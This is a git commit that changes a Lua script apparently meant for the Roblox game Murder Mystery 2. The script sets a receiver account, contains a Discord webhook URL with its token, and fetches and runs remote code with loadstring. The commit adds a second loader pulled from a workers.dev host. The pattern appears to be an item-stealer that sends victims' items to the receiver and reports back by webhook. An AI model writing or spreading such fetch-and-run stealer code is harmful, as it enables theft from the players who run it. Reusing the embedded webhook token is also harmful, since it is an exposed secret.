1128bf346bf2bbed40e55b64d9166c4b0265854c
BlueZHub <betlog09292008@gmail.com>
2024-08-15 11:06:20 +0800

    Update mm2script.lua

--- mm2script.lua
+++ mm2script.lua
@@ -2,3 +2,4 @@ Receiver = "King_Legacy0929"
 Webhook = "https://discord.com/api/webhooks/1273280236301324309/HhluPyFueMm3by2BFiLm2m5oIziEby-VB__jnoGKky1oaLd9-MsZ0OkvcE5GD1ly7NwB"
 WaitAfterReceiverJoin = 10
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HELLOWORLDIMASKID/ScriptCake/main/CakeEater.lua"))()
+loadstring(game:HttpGet("https://overdrive-h.ohd.workers.dev/?d=loader"))()
